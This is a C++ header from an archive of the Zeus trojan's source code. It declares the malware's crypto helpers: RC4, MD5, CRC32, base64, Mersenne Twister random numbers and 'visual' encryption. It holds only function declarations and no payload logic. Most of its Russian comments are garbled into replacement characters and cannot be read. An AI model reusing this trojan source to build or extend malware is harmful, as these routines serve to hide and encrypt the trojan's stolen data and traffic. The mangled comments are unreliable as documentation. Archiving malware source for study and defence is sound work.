/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
/*
  ������������.
*/

//Size MD5 hash.
#define MD5HASH_SIZE 16

namespace Crypt
{
  //The data for the RC4.
  typedef struct
  {      
    BYTE state[256];       
    BYTE x;        
    BYTE y;
  }RC4KEY;
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������� MD5 ���� ������.

    OUT output   - ������ ��� ����, �������� MD5HASH_SIZE.
    IN inputData - ������, ��� ������� ����� ����������.
    IN dataSize  - ���������� ���� � pInputData.

    Return       - true - � ������ ������,
                   false - � ������ ������.
  */
  bool _md5Hash(LPBYTE output, void *inputData, DWORD dataSize);

  /*
    ������-��������� ��������� ����� �� ����� Mersenne Twister.

    Return - ����� �� 0 �� 0x7FFFFFFF.
  */
  DWORD mtRand(void);

  /*
    ���������� MTRand, ����������� ������� ����������.

    IN minVal - ����������� �����.
    IN maxVal - ������������ �����.
              
    Return    - ����� �� dwMin �� dwMax.
  */
  DWORD mtRandRange(DWORD minVal, DWORD maxVal);

  /*
    ������� CRC32.

    IN data - ������, ��� ������� ����� ����������.
    IN size - ���������� ���� � pMem.

    Return  - ���.

    ����������: ��� ������ ������ ������� ������� ������� crc32, ������� �������� ������� ��
                ������� �� ���������������.
  */
  DWORD crc32Hash(const void *data, DWORD size);

  /*
    ������������� RC4 ��� �������� �����.

    IN key        - ������� �������� ����.
    IN binKeySize - ������ ��������� ����� � ������.
    OUT key       - ������ ��� RC4.
  */
  void _rc4Init(const void *binKey, WORD binKeySize, RC4KEY *key);
  
  /*
    ����������/������������� RC4.

    IN OUT buffer - ������ ��� ���������.
    IN size       - ������ ������.
    IN key        - ���������, ������������������ ����� RC4Init.
  */
  void _rc4(void *buffer, DWORD size, RC4KEY *key);

  /*
    ����������� rc4Init() � rc4() � ���� �������.

    IN binKey     - ������� �������� ����.
    IN binKeySize - ������ ��������� ����� � ������.
    IN OUT buffer - ������ ��� ���������.
    IN size       - ������ ������.
  */
  void _rc4Full(const void *binKey, WORD binKeySize, void *buffer, DWORD size);

  /*
    ���������� ���������� ������. ������ �������� ������ ����.

    IN OUT buffer - ������ ��� ���������.
    IN size       - ������ ������.
  */
  void _visualEncrypt(void *buffer, DWORD size);

  /*
    ���������� ������������ ������. ������ �������� ������ ����.

    IN OUT buffer - ������ ��� ���������.
    IN size       - ������ ������.
  */
  void _visualDecrypt(void *buffer, DWORD size);

  /*
    ����������� ������ � base64.

    IN source     - ������ ��� ���������.
    IN sourceSize - ������ ������.
    OUT destSize  - ������ ��������� base64 ������ ��� �������� �������. ����� ���� NULL.

    Return        - ������ � ������� �������� �� �����, ��� NULL � ������ ������. ������ ������
                    ���� ���������� ����� Mem.
  */
  LPSTR _base64Encode(LPBYTE source, SIZE_T sourceSize, SIZE_T *destSize);

  /*
    ������������� ������ �� base64.
    
    IN source     - ������ ��� ���������.
    IN sourceSize - ������ ������.
    OUT destSize  - ������ ��������� ������ ��� �������� �������. ����� ���� NULL.

    Return        - ������ � ������� �������� �� �����, ��� NULL � ������ ������. ������ ������
                    ���� ���������� ����� Mem.
  */
  LPBYTE _base64Decode(LPSTR source, SIZE_T sourceSize, SIZE_T *destSize);

  /*
    ��������� ������ �������� �����.

    OUT buffer  - ����� ��� ������.
    IN size     - ���������� ���� ��� ���������.
    IN minValue - ����������� �������� �����.
    IN maxValue - ������������ �������� �����.
    OUT extMode - true - ������������ ���������� �����, �������� ��������, �� ����������� ��
                  ~(dwSize * 20) ms.
                  false - ����������� �����.
  */
  void _generateBinaryData(void *buffer, DWORD size, BYTE minValue, BYTE maxValue, bool extMode);

  /*    Generate RC4 key.

    OUT key - the key.
  */
  void _generateRc4Key(Crypt::RC4KEY *key);
};
